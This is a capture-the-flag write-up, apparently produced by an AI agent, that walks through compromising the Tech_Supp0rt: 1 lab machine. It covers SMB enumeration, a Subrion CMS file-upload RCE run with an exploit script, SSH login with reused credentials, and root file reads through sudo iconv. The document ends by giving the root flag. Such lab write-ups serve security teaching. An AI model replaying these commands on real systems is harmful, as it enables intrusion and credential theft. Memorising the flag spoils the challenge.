# Tech_Supp0rt: 1 - CTF Writeup
(*Solved by gemini-cli*)

## Target Information
- **IP Address:** 10.48.149.115
- **Hostname:** TechSupport
- **OS:** Linux (Ubuntu 16.04)

## Summary
Tech_Supp0rt: 1 is a CTF challenge that involves SMB enumeration, decoding multi-layered encoded strings, exploiting an authenticated file upload vulnerability in Subrion CMS, and leveraging a sudo misconfiguration in the `iconv` binary to escalate privileges to root.

---

## 1. Enumeration

### Nmap Scan
The initial scan identified several open ports:
- **Port 22 (SSH):** Open
- **Port 80 (HTTP):** Apache 2.4.18
- **Port 139/445 (SMB):** Samba

### SMB Enumeration
Using `smbclient`, I discovered a share named `websvr`.
```bash
smbclient -L //10.48.149.115/ -N
```
Accessing the `websvr` share revealed a file named `enter.txt`.
```text
Goal List:
1. Setup Subrion CMS
2. Setup Wordpress
3. Fix /subrion (broken)

Credentials (cooked with magical formula):
admin:7sKvntXdPEJaxazce9PXi24zaFrLiKWCk
```

### Decoding the "Magical Formula"
The password `7sKvntXdPEJaxazce9PXi24zaFrLiKWCk` appeared to be encoded multiple times:
1.  **Base58 Decode:** `KUZE42DCKREXOTLKIU6Q====`
2.  **Base32 Decode:** `U2NhbTIwMjE=`
3.  **Base64 Decode:** `Scam2021`

**Decoded Credentials:** `admin:Scam2021`

---

## 2. Web Exploitation

### Subrion CMS
Navigating to `http://10.48.149.115/subrion/panel/` provided access to the Subrion CMS admin panel using the decoded credentials.

### CVE-2018-19422 (Arbitrary File Upload)
Subrion CMS 4.2.1 is vulnerable to an authenticated arbitrary file upload vulnerability. By uploading a `.phar` file (which bypasses the `.php` extension filter), I gained Remote Code Execution (RCE).

I used a modified version of exploit `49876.py` to automate the upload and command execution:
```bash
python3 subrion_exploit.py -u http://10.48.149.115/subrion/panel/ -l admin -p Scam2021 -c "id"
```
Output: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`

---

## 3. Lateral Movement

### Finding User Credentials
While exploring the file system via RCE, I checked the WordPress installation at `/var/www/html/wordpress/`.
The `wp-config.php` file contained database credentials:
```php
define( 'DB_USER', 'support' );
define( 'DB_PASSWORD', 'ImAScammerLOL!123!' );
```

### SSH Access
Checking `/etc/passwd` revealed a local user named `scamsite`. Attempting to SSH into the machine with `scamsite:ImAScammerLOL!123!` was successful.
```bash
ssh scamsite@10.48.149.115
```

---

## 4. Privilege Escalation

### Sudo Permissions
Checking `sudo -l` for the user `scamsite`:
```text
User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```

### Exploiting iconv
The `iconv` binary can be used to read files that the user otherwise wouldn't have access to by converting their encoding. Since it can be run as root via `sudo`, I used it to read the root flag.

```bash
sudo /usr/bin/iconv -f UTF-8 -t UTF-8 /root/root.txt
```

---

## 5. Flags
- **Root Flag:** `851b8233a8c09400ec30651bd1529bf1ed02790b`
